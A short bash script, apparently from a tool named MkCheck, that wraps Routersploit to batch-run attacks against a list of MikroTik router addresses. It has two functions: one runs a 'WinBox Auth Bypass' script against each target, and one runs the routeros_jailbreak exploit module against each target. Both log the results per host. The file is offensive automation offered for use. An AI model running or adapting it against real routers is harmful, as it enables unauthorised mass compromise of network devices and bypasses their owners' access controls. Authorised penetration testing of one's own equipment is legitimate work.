#!/bin/bash
######################
#  Routersploit Opts #
######################
# WinBox Auth Bypass #
######################
authbox(){
	for name in `cat /opt/MkCheck/files/rsf.txt`
		do
			WB=$(sudo python3 winbox.py ${name})
			echo "${WB}" >> /opt/MkCheck/results/RSF/${SESSION}/WinBox.${name}
			echo "${WB}" >> /opt/MkCheck/results/RSF/${SESSION}/WinBox.final
			echo "${WB}"
			echo "======================================================================" >> /opt/MkCheck/results/RSF/${SESSION}/WinBox.final
		done
}
####################
# Jail Break Check #
jailer(){
	for name in `cat /opt/MkCheck/files/rsf.txt`
		do
			JAIL=$(sudo python3 rsf.py -m exploits/routers/mikrotik/routeros_jailbreak -s "target ${name}")
			echo "${JAIL}" >> /opt/MkCheck/results/RSF/${SESSION}/Jail.${name}
			echo "${JAIL}" >> /opt/MkCheck/results/RSF/${SESSION}/Jailbreak.final
			echo "${JAIL}"
			echo "======================================================================" >> /opt/MkCheck/results/RSF/${SESSION}/Jailbreak.final
		done
}
while getopts "aj" options; do            	            # Loop: Get the next option;
	case "${options}" in
        a)
			cd /opt/MkCheck/scripts
            authbox
            ;;

        j)
			cd /root/routersploit
            jailer
            ;;

    esac
done
